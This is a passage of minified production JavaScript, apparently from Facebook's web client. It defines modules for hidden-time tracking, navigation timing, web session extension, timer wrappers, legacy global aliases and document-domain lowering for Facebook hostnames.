    for (--e; e > 0; e--) if (d[e].key > a) d[e].value && (b += d[e + 1].key - d[e].key);else break;
    d[e].value && (b = d[e + 1].key - a);
    return b;
  }
  function b() {
    return !0;
  }
  g.getHiddenTimings = m;
  g.getHiddenTime = a;
  g.supported = b;
}, 99);
__d("performanceNavigationStart", ["performance"], function (a, b, c, d, e, f) {
  var g,
    h = typeof window !== "undefined" ? window : self;
  if ((g || (g = b("performance"))).now) {
    if ((g || (g = b("performance"))).timing && (g || (g = b("performance"))).timing.navigationStart) a = function () {
      return (g || (g = b("performance"))).timing.navigationStart;
    };else {
      if (typeof h._cstart === "number") a = function () {
        return h._cstart;
      };else {
        var i = Date.now();
        a = function () {
          return i;
        };
      }
      a.isPolyfilled = !0;
    }
  } else a = function () {
    return 0;
  }, a.isPolyfilled = !0;
  e.exports = a;
}, null);
__d("bootstrapWebSession", ["WebSession", "WebSessionDefaultTimeoutMs", "performanceNavigationStart"], function (a, b, c, d, e, f, g) {
  "use strict";

  function h(a) {
    a = c("performanceNavigationStart")() || a;
    return Number.isInteger(a) ? a : null;
  }
  var i = !1;
  function a(a) {
    if (i === !0) return;
    i = !0;
    a = h(a);
    a != null && a > 0 && d("WebSession").extend(a + c("WebSessionDefaultTimeoutMs"));
  }
  g["default"] = a;
}, 98);
__d("clearIntervalBlue", [], function (a, b, c, d, e, f) {
  var g = a.__fbNativeClearTimeout || a.clearTimeout;
  function b(a) {
    g(a);
  }
  f["default"] = b;
}, 66);
__d("clearTimeoutBlue", [], function (a, b, c, d, e, f) {
  var g = a.__fbNativeClearTimeout || a.clearTimeout;
  function b(a) {
    g(a);
  }
  f["default"] = b;
}, 66);
__d("legacy:arbiter", ["Arbiter"], function (a, b, c, d, e, f) {
  a.Arbiter = b("Arbiter");
}, 3);
__d("legacy:bootloader", ["Bootloader"], function (a, b, c, d, e, f) {
  a.Bootloader = b("Bootloader");
}, 3);
__d("legacy:css", ["CSS"], function (a, b, c, d, e, f) {
  a.CSS = b("CSS");
}, 3);
__d("legacy:dom-core", ["$", "ge"], function (a, b, c, d, e, f) {
  a.$ = a.$ || b("$"), a.ge = b("ge");
}, 3);
__d("legacy:emptyFunction", ["emptyFunction"], function (a, b, c, d, e, f) {
  a.emptyFunction = b("emptyFunction");
}, 3);
__d("goURI", ["URI"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("URI").go;
}, 98);
__d("legacy:goURI", ["goURI"], function (a, b, c, d, e, f) {
  a.goURI = b("goURI");
}, 3);
__d("legacy:onload", ["PageEvents", "Run"], function (a, b, c, d, e, f) {
  a.PageEvents = b("PageEvents");
  a.onloadRegister_DEPRECATED = (c = b("Run")).onLoad;
  a.onloadRegister = function () {
    return b("Run").onLoad.apply(this, arguments);
  };
  a.onafterloadRegister_DEPRECATED = c.onAfterLoad;
  a.onafterloadRegister = function () {
    return b("Run").onAfterLoad.apply(this, arguments);
  };
  a.onleaveRegister = c.onLeave;
  a.onbeforeunloadRegister = c.onBeforeUnload;
  a.onunloadRegister = c.onUnload;
}, 3);
__d("legacy:parent", ["Parent"], function (a, b, c, d, e, f) {
  a.Parent = b("Parent");
}, 3);
__d("LowerDomainRegex", [], function (a, b, c, d, e, f) {
  "use strict";

  a = /(^|\.)(facebook|facebookcorewwwi|facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd|workplace|bulletin|www.novi)\..*/;
  b = /\.(facebook\.(sg|net)|facebookcorewwwi\.(?:test)?onion|facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd\.onion|workplace\.com|novi\.com|bulletin\.com)$/;
  f.domainRegex = a;
  f.hostnameRegex = b;
}, 66);
__d("lowerFacebookDomain", ["LowerDomainRegex"], function (a, b, c, d, e, f, g) {
  b = window.location.hostname.match(d("LowerDomainRegex").hostnameRegex);
  var h = b ? b[1] : "facebook.com";
  a.setDomain = function (a) {
    h = a;
  };
  a.isValidDocumentDomain = function () {
    return document.domain == h;
  };
  function a() {
    document.domain = h;
  }
  c = a;
  g["default"] = c;
}, 98);
__d("lowerDomain", ["LowerDomainRegex", "lowerFacebookDomain"], function (a, b, c, d, e, f, g) {
  ((a = document.domain) != null ? a : "").toLowerCase().match(d("LowerDomainRegex").domainRegex) && c("lowerFacebookDomain")();
}, 34);
__d("markJSEnabled", [], function (a, b, c, d, e, f) {
  a = document.documentElement;
  a.className = a.className.replace("no_js", "");
}, null);
__d("setIntervalAcrossTransitionsBlue", ["TimeSlice"], function (a, b, c, d, e, f, g) {
  var h = a.__fbNativeSetInterval || a.setInterval;
  function b(b, d) {
    var e = c("TimeSlice").guard(b, "setInterval");
    for (var f = arguments.length, g = new Array(f > 2 ? f - 2 : 0), i = 2; i < f; i++) g[i - 2] = arguments[i];
    return Function.prototype.apply.call(h, a, [e, d].concat(g));
  }
  g["default"] = b;
}, 98);
__d("setTimeoutAcrossTransitionsBlue", ["TimeSlice"], function (a, b, c, d, e, f, g) {
  var h = a.__fbNativeSetTimeout || a.setTimeout;
  function b(b, d) {
    var e = c("TimeSlice").guard(b, "setTimeout", {
      propagationType: c("TimeSlice").PropagationType.CONTINUATION,
      registerCallStack: !0
    });
    for (var f = arguments.length, g = new Array(f > 2 ? f - 2 : 0), i = 2; i < f; i++) g[i - 2] = arguments[i];
    return Function.prototype.apply.call(h, a, [e, d].concat(g));
  }
  g["default"] = b;
}, 98);
__d("setTimeoutBlue", ["TimeSlice", "TimerStorage", "setTimeoutAcrossTransitions"], function (a, b, c, d, e, f, g) {
  function a(a, b) {
    var d,
      e = function () {
        c("TimerStorage").unset(c("TimerStorage").TIMEOUT, d);
        for (var b = arguments.length, e = new Array(b), f = 0; f < b; f++) e[f] = arguments[f];
        Function.prototype.apply.call(a, this, e);
      };
    c("TimeSlice").copyGuardForWrapper(a, e);
    for (var f = arguments.length, g = new Array(f > 2 ? f - 2 : 0), h = 2; h < f; h++) g[h - 2] = arguments[h];
    d = c("setTimeoutAcrossTransitions").apply(void 0, [e, b].concat(g));
    c("TimerStorage").set(c("TimerStorage").TIMEOUT, d);
    return d;
  }
  g["default"] = a;
}, 98);